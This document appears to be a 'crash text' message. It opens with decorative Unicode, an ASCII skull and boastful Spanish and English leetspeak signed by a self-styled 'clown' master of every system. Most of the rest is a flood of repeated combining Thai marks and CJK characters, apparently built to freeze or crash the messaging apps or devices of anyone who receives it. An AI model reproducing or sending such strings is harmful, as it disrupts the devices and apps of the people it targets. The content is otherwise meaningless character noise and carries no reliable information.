ۣۜひČђቾђẲ፝͜͡⚛
 ╔═══════════╗ ╔═╝███████████╚═╗ ╔╝███████████████╚╗ ║█████████████████║ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ ║█████████████████║ ║█████████████████║ ║█╔█████████████╗█║ ╚╦╝███▒▒███▒▒███╚╦╝ ╔╝██▒▒▒▒███▒▒▒▒██╚╗ ║██▒▒▒▒▒███▒▒▒▒▒██║ ║██▒▒▒▒█████▒▒▒▒██║ ╚╗███████████████╔╝ ╔═╬══╦╝██▒█▒██╚╦══╝.▒.. ║█║══║█████████║　...▒. ║█║══║█║██║██║█║　.▒.. ║█║══╚═╩══╩╦═╩═╩═╦╗▒. ╔╝█╚══╦═╦══╦╩═╦═╦═╩╝ ╔╝█████║█║██║██║█║ ║██████║█████████║ /)/) ( . .) ✵ ( づ むマঔৣ͜͡➳像 GŘλ₦ MλEŞŦŘØ ÐE ŦØÐØ ŞłŞŦEMλ ŁłÐEŘ ₡Łλ¥ EŁ Pλ¥λŞØ ₡ŘEλÐØŘ ÐE Łλ łŁUŞłØ₦ ł'M ŦҤE ₡ŁØ₩₦ ŁλUGҤł₦G λŦ ¥ØU ...........................ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.⛦.ౘ.ౘ.⛦.Ń.Š.ĺ.Š.ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻ํ㜻